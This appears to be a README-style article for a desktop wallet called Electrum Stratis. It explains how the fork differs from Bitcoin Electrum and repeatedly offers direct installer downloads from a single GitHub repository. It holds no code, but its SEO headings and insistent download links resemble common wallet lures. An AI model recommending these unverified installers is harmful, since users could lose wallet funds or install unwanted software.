![Electrum-Stratis](assets/banner-article.png)

# Is Electrum a Bitcoin wallet? Yes - and that is why this question matters

<p align="center">Electrum is Bitcoin; this fork is not</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Electrum is a Bitcoin wallet, and has been since its first release. Electrum Stratis is a fork of that codebase configured for the legacy Stratis chain: same interface family, different coin, different address format, different maintainers. That is why a page about "Electrum" can be right about Bitcoin and wrong for your STRAT balance, and why the distinction decides whether an answer is relevant to you. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you searched | What you got | What you actually need |
|---|---|---|
| Electrum wallet | Bitcoin documentation | The Stratis fork's own procedures |
| Electrum seed restore | Bitcoin derivation rules | Legacy Stratis derivation and address preview |
| Electrum safety | Judgements about the Bitcoin wallet | This fork's own audit status |
| Electrum download | The Bitcoin project's site | The Stratis release page |
| Electrum fee settings | Bitcoin mempool guidance | The legacy chain's fee behaviour |

</div>

The shared name is the whole problem. Almost every "Electrum" result on the web is about Bitcoin, and almost every user searching it in this context holds STRAT.

## Why it happens

A fork inherits code, not branding rights or coin parameters. The interface, the seed model, the server protocol and much of the vocabulary carry over; the coin parameters do not. Address prefixes, key prefixes, coinbase maturity and the network magic all differ, which is why a Stratis wallet cannot read a Bitcoin address and a Bitcoin wallet cannot see STRAT.

That inheritance is useful - the security model, the backup model and the recovery logic are the same family - and it is dangerous, because guidance written for Bitcoin reads as if it applies. Sometimes it does: a seed restores the wallet that generated it, whoever made the software. Sometimes it does not: the address format and the fee market are chain-specific.

The maintained build, whose current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), states its lineage plainly: code rather than organisation, with its own maintainers and its own release history. The name alone would otherwise imply an affiliation that does not exist, and the build that says so is the one currently shipped.

## Fix

1. **Decide which wallet you are holding before following any instructions.** The wallet's own identity - banner, about view, security posture - names the chain it serves. Read it before reading a guide.
2. **Use Bitcoin Electrum guidance only for shared concepts.** Seeds, wallet files, encryption and the general recovery logic transfer. Address formats, fee levels, server lists and version numbers do not.
3. **Check the address format before sending anything.** Legacy Stratis addresses have their own prefix; a Bitcoin address pasted into this wallet will be rejected, and a Stratis address pasted into a Bitcoin wallet likewise.
4. **Get the build from the right place.** The release page for this project carries these assets ([where to get Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md)); the Bitcoin project's download page carries builds that cannot hold STRAT.
5. **Treat "Electrum is safe" as a statement about Bitcoin.** For this fork, the safety question is answered by its own verification story, not by the parent project's reputation.

Mixing the two wallets produces two specific failures: a restore that "works" but shows nothing, because the derivation belongs to another chain, and a send that never arrives, because the address belonged to another network.

## If that did not work

If a restore produces addresses you do not recognise, check the chain before doubting the seed. The same words on a different chain produce different addresses, and the preview is designed to show that before you commit.

If a send is rejected for an invalid address, that is the address-format check doing its job. Do not look for a setting that relaxes it; copy the address again from the wallet that controls it.

If a guide's screenshots do not match what you see, the guide is probably about the Bitcoin wallet. The procedures in this documentation are written against this wallet's own labels.

If you are unsure whether a page is about Bitcoin or Stratis, look for the coin in the page's examples. A page that never names the coin is usually about Bitcoin, because it assumes the default.

## Prevention

- Read the chain name on the wallet before following any guide.
- Keep Bitcoin and Stratis wallets on separate machines or separate profiles.
- Verify address prefixes before every send.
- Download from the release page that matches the coin you hold.
- Treat a name match as a coincidence until the coin is confirmed.
- Check the coin named in a guide before following it; screenshots of another wallet prove nothing about this one.

## FAQ

### Is Electrum a BTC wallet?

Yes. Electrum is a Bitcoin wallet, and its documentation, downloads and community are about Bitcoin. Electrum Stratis is a fork of its codebase for the legacy Stratis chain, with its own coin parameters and its own maintainers.

### Is electrum a safe bitcoin wallet?

Electrum has a long track record and an active development community; its safety depends on downloading it from its own site and keeping the seed offline, as with any self-custody wallet. That judgement does not transfer to this fork, which has its own verification status.

### Can I open my Electrum Bitcoin wallet in Electrum Stratis?

No. The coin parameters differ, so addresses and keys belong to different networks. Importing a Bitcoin seed into a Stratis build produces addresses for Stratis, not access to Bitcoin funds.

### Why does the interface look the same, then?

Because it is the same codebase with different configuration. The interface is inherited; the coin is not. That similarity is useful for learning the model and hazardous for assuming the details.

<!-- DOWNLOAD-BLOCK -->

The confusion is understandable, because the code began as Electrum and the interface looks familiar. What matters is the network the build connects to: this one speaks to the legacy Stratis chain, holds STRAT, and cannot see BTC, ETH or STRAX. A wallet is defined by the chain it syncs, not by the family tree of its source code, and the two answers diverge here.

## Related articles

- [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)
- [STRAT is not STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-strat-and-strax-differ.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
